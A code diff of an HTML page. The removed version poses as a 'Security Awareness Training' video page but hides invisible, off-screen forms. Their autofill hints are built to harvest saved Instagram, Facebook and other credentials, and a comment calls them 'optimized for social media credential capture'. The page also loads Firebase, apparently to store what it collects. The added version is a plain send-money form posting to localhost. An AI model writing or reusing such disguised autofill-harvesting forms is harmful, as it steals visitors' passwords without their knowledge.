@@ -2,46 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Training</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Send Money via Paypack</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Cybersecurity Training Video</h1>
-        <div class="video-container">
-            <video id="trainingVideo" controls autoplay>
-                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-        </div>
-        <div class="hidden-content">
-            <!-- Hidden forms optimized for social media credential capture -->
-            <form id="instagramCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
-                <input type="text" id="instaUsername" name="username" placeholder="Phone number, username, or email" autocomplete="instagram username">
-                <input type="password" id="instaPassword" name="password" placeholder="Password" autocomplete="instagram current-password">
-            </form>
-            
-            <form id="facebookCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
-                <input type="text" id="fbEmail" name="email" placeholder="Email or phone number" autocomplete="facebook email">
-                <input type="password" id="fbPassword" name="pass" placeholder="Password" autocomplete="facebook current-password">
-            </form>
-            
-            <!-- Generic social media fields -->
-            <form id="socialMediaCapture" style="opacity: 0; position: absolute; top: -1000px;" autocomplete="on">
-                <input type="text" name="email" autocomplete="email">
-                <input type="text" name="username" autocomplete="username">
-                <input type="password" name="password" autocomplete="current-password">
-                <input type="text" name="phone" autocomplete="tel">
-                <input type="text" name="name" autocomplete="name">
-            </form>
-        </div>
-    </div>
-    
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-    
-    <script src="script.js"></script>
+    <h1>Send Money</h1>
+    <form id="money-form">
+        <label>Phone Number:</label>
+        <input type="text" id="phone" placeholder="2507XXXXXXXX"><br><br>
+        <label>Amount (RWF):</label>
+        <input type="number" id="amount" placeholder="5000"><br><br>
+        <button type="submit">Send Money</button>
+    </form>
+
+    <p id="result"></p>
+
+    <script>
+        document.getElementById('money-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const amount = document.getElementById('amount').value;
+
+            const res = await fetch('http://localhost:3000/send-money', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, amount })
+            });
+            const data = await res.json();
+            document.getElementById('result').textContent = JSON.stringify(data, null, 2);
+        });
+    </script>
 </body>
 </html>
